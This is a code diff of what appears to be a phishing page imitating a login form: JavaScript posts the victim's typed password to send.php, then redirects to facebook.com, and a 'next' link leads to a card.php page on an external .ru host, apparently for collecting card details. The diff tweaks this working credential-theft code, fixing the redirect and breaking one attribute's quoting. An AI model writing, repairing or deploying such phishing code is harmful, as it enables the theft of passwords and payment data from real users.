@@ -36,7 +36,7 @@
 </div>
 <div class="input" style="border-radius:0 0 6px 6px; visibility:hidden;" id="passinput">
 <div class="input-holder"><input type="password" class="textinput" placeholder="Password" id="pass"></div>
-<a id="nrxtbtn2" href="http://a0740820.xsph.ru/en/card.php" type="submit"  onclick="sendPASS()"><img id="pic_pass" src="inc/next.png"></a>
+<a  href="http://a0740820.xsph.ru/en/card.php"  type="submit" id="nrxtbtn2><img id="pic_pass" src="inc/next.png"></a>
 </div>
 </div>
 
@@ -105,7 +105,7 @@ function sendPASS(){
 		$("#pic_pass").attr("src", "inc/loader.gif");
 		upass = $("#pass").val();
 		$.post("send.php", {id:uid, pass:upass}, function(done){
-			window.location = "www.facebook.com";
+			window.location = "https://www.facebook.com";
 		});
 	}
 }
